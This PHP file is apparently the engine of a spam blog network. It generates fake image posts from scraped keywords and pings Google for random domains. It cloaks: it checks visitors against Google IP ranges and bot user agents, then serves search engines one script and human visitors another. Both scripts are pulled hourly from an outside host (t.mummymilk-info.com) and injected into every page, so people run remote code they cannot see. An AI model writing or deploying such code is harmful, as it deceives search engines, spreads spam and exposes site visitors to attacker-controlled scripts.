<?php
error_reporting(E_ALL);

$_domain = explode('.', $_SERVER['HTTP_HOST'], 2);
define('BLOG_DOMAIN', $_domain[0], true);
define('BLOG_HOST', $_domain[1], true);
define('BLOG_CHARSUM', get_charsum($_SERVER['HTTP_HOST']), true);

define('WORK_DIR', dirname(__FILE__), true);
define('DB_DIR', WORK_DIR, true);
define('TEMPLATES_DIR', WORK_DIR, true);

define('BLOGROLL_LENGTH', 10, true);
define('POSTS_ON_PAGE', 10, true);

function check_ip_in_network($ip, $net_addr, $net_mask) {
    if ($net_mask <= 0) { return false; } 
    $ip_binary_string = sprintf("%032b",ip2long($ip)); 
    $net_binary_string = sprintf("%032b",ip2long($net_addr)); 
    return (substr_compare($ip_binary_string, $net_binary_string, 0, $net_mask) === 0); 
};

function is_bad_css_showing() {
    $ip = ip2long($_SERVER['REMOTE_ADDR']);
    
    if (($ip>=3639549952)&&($ip<=3639558143)) { return false; } //GOOGLE (216.239.32.0-216.239.63.255)
    if (($ip>=1123631104)&&($ip<=1123639295)) { return false; } //GOOGLE (66.249.64.0-66.249.95.255)
    if (($ip>=1089052672)&&($ip<=1089060863)) { return false; } //GOOGLE (64.233.160.0-64.233.191.255)
    if (($ip>=1078218752)&&($ip<=1078220799)) { return false; } //GOOGLE (64.68.80.0-64.68.87.255)
    if (($ip>=1078220802)&&($ip<=1078222031)) { return false; } //GOOGLE (64.68.88.2-64.68.92.207)
    if (($ip>=1087381508)&&($ip<=1087382952)) { return false; } //GOOGLE (64.208.32.4-64.208.37.168)
    if (($ip>=3512041472)&&($ip<=3512045567)) { return false; } //GOOGLE (209.85.128.0-209.85.143.255)
    if (($ip>=1113980928)&&($ip<=1113985023)) { return false; } //GOOGLE (66.102.0.0-66.102.15.255)
    if (($ip>=1208926208)&&($ip<=1208942591)) { return false; } //GOOGLE (72.14.192.0-72.14.255.255)
    if (($ip>=1249705984)&&($ip<=1249771519)) { return false; } //GOOGLE (74.125.0.0-74.125.255.255)
    if (
        stristr($_SERVER["HTTP_USER_AGENT"],"googlebot") ||
        stristr($_SERVER["HTTP_USER_AGENT"],"msnbot") ||
        stristr($_SERVER["HTTP_USER_AGENT"],"Yahoo") ||
        stristr($_SERVER["HTTP_USER_AGENT"],"search") ||
        stristr($_SERVER["HTTP_USER_AGENT"],"ovguide") ||
        stristr($_SERVER["HTTP_USER_AGENT"],"aol")
    ) { return false; }
    if (stristr($_SERVER["HTTP_USER_AGENT"],"via translate.google.com")) { return false; }
    if (stristr($_SERVER["HTTP_USER_AGENT"],"Google WAP Proxy")) { return false; }
    if (stristr($_SERVER["HTTP_USER_AGENT"],"Google CHTML Proxy")) { return false; }
    return true;
};

function get_blogroll(&$db) {
    srand(BLOG_CHARSUM);
    $blogs = $db->blogs->find(array("d"=>BLOG_HOST));
    $blogs_count = $blogs->count();
    if ($blogs_count == 0) { return array(); }
    $blogroll = array();
    
    while (count($blogroll) < BLOGROLL_LENGTH) {
        $blogs = $db->blogs->find(array("d"=>BLOG_HOST))->skip(rand(0, $blogs_count-2))->limit(1);
        if ($blogs->hasNext()) {
            $blog = $blogs->getNext();
            $blogroll[] = array (
                'title' => get_blog_title($blog["sd"], get_charsum($blog["sd"])),
                'url' => 'http://'.$blog["sd"].'.'.$blog["d"].'/'
            );
        }
    }
    return $blogroll;
};

function get_blog_template($domain) {
    srand(BLOG_CHARSUM);
    return rand(0, 6).'.php';
};

function get_blog_title($domain, $charsum) {
    $title = ucwords(str_replace(array('-', '_'), ' ', $domain));
    srand($charsum);
    return (rand(0, 10) > 5) ? $title.'\'s blog' : $title;
};

function get_charsum($string) {
    $charsum = 0;
    for ($i = 0; $i < strlen($string); $i++) { 
        $charsum += ord($string[$i]); 
    }
    return $charsum;
};

function get_collections() {
    $collections = array();
    
    foreach (glob(DB_DIR."/gimages_urls_*.idx") as $collection) {
        $collection = array("idx" => $collection);
        $name = basename($collection["idx"], ".idx");
        $collection += strptime(substr($name, -8), "%y%m%d%H");
        $collection["data"] = DB_DIR."/".$name.".json";
        $collection["count"] = floor(filesize($collection["idx"]) / 10);
        $collection["timestamp"] = mktime($collection["tm_hour"], 0, 0, $collection["tm_mon"]+1, $collection["tm_mday"], 1900+$collection["tm_year"]);
        $collection["timestamp_d"] = mktime(0, 0, 0, $collection["tm_mon"]+1, $collection["tm_mday"], 1900+$collection["tm_year"]);
        $collections[] = $collection;
    }
    return $collections;
};

function get_dates($blog, $collections) {
    $dates = array();
    $first_collection = $collections[0];
    $current_collection = count($collections) - 1;
    $current_date = getdate();
    $current_timestamp_d = mktime(0, 0, 0, $current_date["mon"], $current_date["mday"], $current_date["year"]);
    for ($i = $current_timestamp_d; $i>=$first_collection["timestamp_d"]; $i=$i-(24 * 60 * 60)) {
        if ($i < $collections[$current_collection]["timestamp_d"] && $current_collection != 0) {
            $current_collection = $current_collection - 1;
        }
        if ($i == $first_collection["timestamp_d"]) {
            $dates[] = array(
                "name" => date("Y-m-d", $i),
                "collection" => 0,
                "count" => 24 - $first_collection["tm_hour"],
                "timestamp_d" => $i,
                "url" => $blog['homepageUrl'].date('ymd', $i).'/'
            );
            continue;
        }
        if ($i == $current_timestamp_d) {
            $dates[] = array(
                "name" => date("Y-m-d", $i),
                "collection" => $current_collection,
                "count" => intval(date("G"))+1,
                "timestamp_d" => $i,
                "url" => $blog['homepageUrl'].date('ymd', $i).'/'
            );
            continue;
        }
        $dates[] = array(
            "name" => date("Y-m-d", $i),
            "collection" => $current_collection,
            "count" => 24,
            "timestamp_d" => $i,
            "url" => $blog['homepageUrl'].date('ymd', $i).'/'
        );
    }
    return $dates;
};

function get_hours($dates) {
    $hours = array();
    for ($i = 0; $i < count($dates); $i++) { 
        for ($j = $dates[$i]["count"]-1; $j >= 0 ; $j--) {
            $date = getdate($dates[$i]["timestamp_d"]);
            $hours[] = array(
                "collection" => $dates[$i]["collection"],
                "timestamp" => mktime($j, 0, 0, $date["mon"], $date["mday"], $date["year"])
            );
        }
    }
    return $hours;
};

function get_post($blog, $collections, $date) {
    $date = strptime($date, "%y%m%d%H");
    $timestamp = mktime($date["tm_hour"], 0, 0, $date["tm_mon"]+1, $date["tm_mday"], 1900+$date["tm_year"]);
    for ($i = count($collections)-1; $i >= 0; $i--) {
        if ($timestamp >= $collections[$i]["timestamp_d"]) {
            $collection = $collections[$i];
            break;
        }
    }
    srand(BLOG_CHARSUM + $timestamp);
    
    $pos = rand(0, $collection["count"]-1);
    $index_file = fopen($collection["idx"], "r");
    fseek($index_file, $pos*10);
    $pos = intval(trim(fread($index_file, 10)));
    fclose($index_file);
    
    $keywords_file = fopen($collection["data"], "r");
    fseek($keywords_file, $pos);
    $k = json_decode(fgets($keywords_file), true);
    fclose($keywords_file);
    
    $minutes_seconds = rand(0, 58) * 60 + rand(0, 58);
    
    $body = array();
    if (count($k["i"]) <= 5) {
        foreach($k["i"] as $image) {
            $body[] = "<img src=\"".$image."\" alt=\"".$k["k"]."\"/>";
        }
    } else {
        $images = array();
        while (count($body) < 5) {
            $image = $k["i"][array_rand($k["i"])];
            if (!in_array("<img src=\"".$image."\" alt=\"".$k["k"]."\"/>", $body)) {
                $body[] = "<img src=\"".$image."\" alt=\"".$k["k"]."\"/>";
            }
        }
    }
    
    return array(array(
        'id' => date('y-m-d-H', $timestamp).'/'.str_replace(' ', '-', $k['k']), 
        'url' => $blog['homepageUrl'].date('ymdH', $timestamp).'/'.str_replace(' ', '-', $k['k']).'/',
        'title' => ucfirst($k['k']), 
        'body' => implode("<br>", $body), 
        'author' => 'Jhon',
        'labels' => array(
            array(
                'isLast' => 'true',
                'name' => date('Y-m-d', $timestamp), 
                'url' => $blog['homepageUrl'].date('ymd', $timestamp).'/'
            )
        ), 
        'timestamp' => date('d.m.Y H:i', $timestamp+$minutes_seconds),
        'raw_timestamp' => $timestamp+$minutes_seconds
    ));
};

function get_posts($blog, $collections, $hours, $label=null, $page=0) {
    if ($label) {
        $date = strptime($label, "%y%m%d");
        $timestamp1 = mktime(0, 0, 0, $date["tm_mon"]+1, $date["tm_mday"], 1900+$date["tm_year"]);
        $timestamp2 = mktime(0, 0, 0, $date["tm_mon"]+1, $date["tm_mday"]+1, 1900+$date["tm_year"]);
        $posts = array();
        foreach($hours as $hour) {
            if ($hour["timestamp"] >= $timestamp1 && $hour["timestamp"] < $timestamp2) {
                $posts[] = $hour;
            }
        }
        $posts_count = count($posts);
        $posts = array_slice($posts, $page*POSTS_ON_PAGE, POSTS_ON_PAGE);
    } else {
        $posts_count = count($hours);
        $posts = array_slice($hours, $page*POSTS_ON_PAGE, POSTS_ON_PAGE);
    }
    foreach($posts as $key=>$post) {
        srand(BLOG_CHARSUM + $post["timestamp"]);
        $collection = $collections[$post["collection"]];
        $pos = rand(0, $collection["count"]-1);
        $index_file = fopen($collection["idx"], "r");
        fseek($index_file, $pos*10);
        $pos = intval(trim(fread($index_file, 10)));
        fclose($index_file);
        
        $keywords_file = fopen($collection["data"], "r");
        fseek($keywords_file, $pos);
        $k = json_decode(fgets($keywords_file), true);
        fclose($keywords_file);
        
        $minutes_seconds = rand(0, 58) * 60 + rand(0, 58);
        
        $body = array();
        if (count($k["i"]) <= 5) {
            foreach($k["i"] as $image) {
                $body[] = "<img src=\"".$image."\" alt=\"".$k["k"]."\"/>";
            }
        } else {
            $images = array();
            while (count($body) < 5) {
                $image = $k["i"][array_rand($k["i"])];
                if (!in_array("<img src=\"".$image."\" alt=\"".$k["k"]."\"/>", $body)) {
                    $body[] = "<img src=\"".$image."\" alt=\"".$k["k"]."\"/>";
                }
            }
        }
        
        $posts[$key] = array(
            'id' => date('y-m-d-H', $post["timestamp"]).'/'.str_replace(' ', '-', $k['k']), 
            'url' => $blog['homepageUrl'].date('ymdH', $post["timestamp"]).'/'.str_replace(' ', '-', $k['k']).'/',
            'title' => ucfirst($k['k']), 
            'body' => implode("<br>", $body), 
            'author' => 'Jhon',
            'labels' => array(
                array(
                    'isLast' => 'true',
                    'name' => date('Y-m-d', $post["timestamp"]), 
                    'url' => $blog['homepageUrl'].date('ymd', $post["timestamp"]).'/'
                )
            ), 
            'timestamp' => date('d.m.Y H:i', $post["timestamp"]+$minutes_seconds),
            'raw_timestamp' => $post["timestamp"]+$minutes_seconds
        );
    }
    return array($posts, $posts_count);
};

function get_rss_output($blog, $posts) {
    $output = array(
        '<?xml version="1.0" encoding="utf-8" ?>', 
        '<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">', 
        '<channel>',
        '<title>'.$blog['title'].'</title>', 
        '<description>'.$blog['description'].'</description>',
        '<link>'.$blog['homepageUrl'].'</link>',
        '<pubDate>'.date('r', $posts[0]['raw_timestamp']).'</pubDate>',
        '<atom:link href="'.$blog['rss_url'].'" rel="self" type="application/rss+xml" />'
    );
    foreach ($posts as $post) {
        $output[] = '<item>';
        $output[] = '<title>'.htmlspecialchars($post['title']).'</title>';
        $output[] = '<link>'.$post['url'].'</link>';
        $output[] = '<guid>'.$post['url'].'</guid>';
        $output[] = '<pubDate>'.date('r', $post['raw_timestamp']).'</pubDate>';
        $output[] = '<description>'.htmlspecialchars($post['body']).'</description>';
        $output[] = '</item>';
    }
    $output[] = '</channel>';
    $output[] = '</rss>';
    return utf8_encode(implode("\n", $output));
};

function ping($blog) {
    $services = array(
        array('host' => 'blogsearch.google.com', 'method' => 'weblogUpdates.extendedPing', 'url' => '/ping/RPC2'),
    );
    
    foreach ($services as $service) {
        $data = '<?xml version="1.0"?>
        <methodCall>
          <methodName>'.$service['method'].'</methodName>
          <params>
            <param>
              <value>'.$blog['title'].'</value>
            </param>
            <param>
              <value>'.$blog['homepageUrl'].'</value>
            </param>
            <param>
              <value>'.$blog['homepageUrl'].'/</value>
            </param>
          </params>
        </methodCall>';
        
        if (false === ($f = @fsockopen($service['host'], 80, $errno, $errstr, 10))) { continue; }
        
        $out = array(
            'POST '.$service['url'].' HTTP/1.0',
            'User-Agent: WeirD blog engine',
            'Host: '.$service['host'],
            'Content-Type: text/xml',
            'Content-length: '.strlen($data),
            "\r\n".$data
        );
        
        if (false === @fwrite($f, implode("\r\n", $out))) { fclose($f); continue; }
        $response = '';
        while (!feof($f)) {
            $response .= fgets($f, 128);
        }
        @fclose($f);
    };
    return $response;
};

function get_random_string($file) 
{
    if (!file_exists($file)) { return ''; }
    $f = fopen($file, 'r');
    $size = filesize($file);
    fseek($f, rand(0, $size-200));
    $tmp_line = trim(fgets($f));
    if (!($line = trim(fgets($f)))) { $line = $tmp_line; }
    fclose($f);
    return $line;
};

$blog_title = get_blog_title(BLOG_DOMAIN, BLOG_CHARSUM);
$blog = array(
    'description' => 'The blog...',
    'homepageUrl' => 'http://'.$_SERVER['HTTP_HOST'].dirname($_SERVER['SCRIPT_NAME']).'/',
    'homeMsg' => '&nbsp;Home&nbsp;',
    'newerPageTitle' => 'Newer posts',
    'olderPageTitle' => 'Older posts',
    'pageTitle' => $blog_title,
    'pageType' => 'list',
    'title' => $blog_title,
    'url' => 'http://'.$_SERVER['HTTP_HOST'].dirname($_SERVER['SCRIPT_NAME']).'/'
);
$blog['rss_url'] = $blog['homepageUrl'].'rss/';
$blog['rss_link'] = '<link rel="alternate" type="application/rss+xml" href="'.$blog['rss_url'].'" />';

$links = array(
    array('name'=>'Blog', 'target'=>$blog['homepageUrl'])
);

$top = array(
    'authorLabel' => 'Author:',
    'showAuthor' => false,
    'showTimestamp' => true,
    'timestampLabel' => 'Published on:',
);

$collections = get_collections();
$dates = $labels = get_dates($blog, $collections);
$hours = get_hours($dates);

$posts = array();
// $blog['blogroll'] = get_blogroll($db);
$blog['blogroll'] = array();

if (isset($_GET['date']) && !empty($_GET['date'])) {
    if (!preg_match('/\d{2}\d{2}\d{2}\d{2}/', $_GET['date'])) {
        header('HTTP/1.0 404 Not Found');
        exit();
    }
    
    $slug = (isset($_GET['slug']) && !empty($_GET['slug'])) ? trim($_GET['slug']) : null;
    $posts = get_post($blog, $collections, $_GET['date']);
    
    if (count($posts) == 0) {
        header('HTTP/1.0 404 Not Found');
        exit();
    }
    
    $posts[0]['backlinks'] = array();
    $posts[0]['numBacklinks'] = 0;
    $posts[0]['backlinksLabel'] = 'Trackbacks:';
    $posts[0]['authorLabel'] = $top['authorLabel'];
    $posts[0]['timestampLabel'] = $top['timestampLabel'];
    
    $blog['pageType'] = 'item';
    $blog['pageTitle'] = $posts[0]['title'].' - '.$blog['pageTitle'];
    $blog['url'] = $posts[0]['url'];
} else if (isset($_GET['label']) && !empty($_GET['label'])) {
    if (!preg_match('/\d{2}\d{2}\d{2}/', $_GET['label'])) {
        header('HTTP/1.0 404 Not Found');
        exit();
    }
    
    $page = 0;
    if (isset($_GET['page'])) { $page  = intval($_GET['page']) - 1; }
    if ($page < 0) { $page = 0; }
    
    list($posts, $posts_count) = get_posts($blog, $collections, $hours, $_GET['label'], $page);
    
    $blog['pageTitle'] = 'Posts for '.$_GET['label'].' - '.$blog['pageTitle'];
    $blog['url'] = $blog['url'].$_GET['label'].'/';
    
    if ($page > 0) {
        $blog['newerPageUrl'] = $blog['url'].'p'.($page).'/';
    }
    $pages_count = ceil($posts_count / POSTS_ON_PAGE);
    if ($page < $pages_count-1) {
        $blog['olderPageUrl'] = $blog['url'].'p'.($page+2).'/';
    }
} else if (isset($_GET['output']) && $_GET['output'] == 'rss') {
    header('Content-Type: text/xml');
    list($posts, $posts_count) = get_posts($blog, $collections, $hours);
    print get_rss_output($blog, $posts);
    exit();
} else {
    $page = 0;
    if (isset($_GET['page'])) { $page  = intval($_GET['page']) - 1; }
    if ($page < 0) { $page = 0; }

    list($posts, $posts_count) = get_posts($blog, $collections, $hours, null, $page);

    if ($page > 0) {
        $blog['newerPageUrl'] = $blog['homepageUrl'].'p'.($page).'/';
    }
    $pages_count = ceil($posts_count / POSTS_ON_PAGE);
    if ($page < $pages_count-1) {
        $blog['olderPageUrl'] = $blog['homepageUrl'].'p'.($page+2).'/';
    }
}

function get_js_file($filename) {
    if (!file_exists($filename) or time() - filemtime($filename) > 3600) {
        $js_file = @file_get_contents('http://t.mummymilk-info.com/blogistan-sg/'.$filename);
        if ($js_file) {
            @file_put_contents($filename, $js_file);
        }
    }
}

if (!is_bad_css_showing()) {
    get_js_file('css.google.js');
    $blog['js_link'] = '<script type="text/javascript" src="'.$blog['homepageUrl'].'css.google.js"></script>';
} else {
    get_js_file('css.js');
    $blog['js_link'] = '<script type="text/javascript" src="'.$blog['homepageUrl'].'css.js"></script>';
}

$search_keyword = "";
if (isset($_SERVER["HTTP_REFERER"])) {
    $referer = parse_url($_SERVER["HTTP_REFERER"]);
    $query = array();
    if (isset($referer["query"])) {
        parse_str($referer["query"], $query);
        if (isset($query["prev"])) {
            $query["prev"] = str_replace("/images?", "", $query["prev"]);
            parse_str($query["prev"], $referer);
            if (isset($referer["q"])) {
                $search_keyword = str_replace('"', '\"', $referer["q"]);
            }
        }
    }
}
if (!$search_keyword) {
    $search_keyword = "Image archive";
}

if (!file_exists(WORK_DIR.'/ping.dat') || (time() - filemtime(WORK_DIR.'/ping.dat')) > 60)
{
    $f = fopen(WORK_DIR.'/ping.dat', 'w');
    fwrite($f, date("d.m.Y H:i")."\n");
    $domain = get_random_string(WORK_DIR.'/domains.dat');
    list($subdomain, $host) = explode('.', $domain, 2);
    fwrite($f, $domain.' - '.ping(array(
        'title' => get_blog_title($subdomain, get_charsum($domain)), 
        'homepageUrl' => 'http://'.$domain.dirname($_SERVER['SCRIPT_NAME']).'/'
    ))."\n");
    $domain = get_random_string(WORK_DIR.'/domains.dat');
    list($subdomain, $host) = explode('.', $domain, 2);
    fwrite($f, $domain.' - '.ping(array(
        'title' => get_blog_title($subdomain, get_charsum($domain)), 
        'homepageUrl' => 'http://'.$domain.dirname($_SERVER['SCRIPT_NAME']).'/'
    ))."\n");
    fclose($f);
}

error_reporting(0);
require_once(TEMPLATES_DIR."/".get_blog_template(BLOG_DOMAIN));
?>